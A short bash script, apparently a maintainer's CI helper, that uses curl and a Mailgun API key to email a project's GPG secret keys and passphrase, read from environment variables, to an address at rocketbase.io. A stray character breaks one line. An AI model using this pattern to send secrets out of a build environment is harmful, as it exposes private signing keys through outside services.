#!/usr/bin/env bash

curl -s --user $MAILGUN_KEY \
    https://api.mailgun.net/v3/rocketbase.io/messages \
    -F from='postmaster@rocketbase.io' \
    -F to=marten@rocketbase.io \
´    -F subject='Values' \
    -F text="$GPG_SECRET_KEYS

$GPG_PASSPHRASE

$GPG_EXECUTABLE"
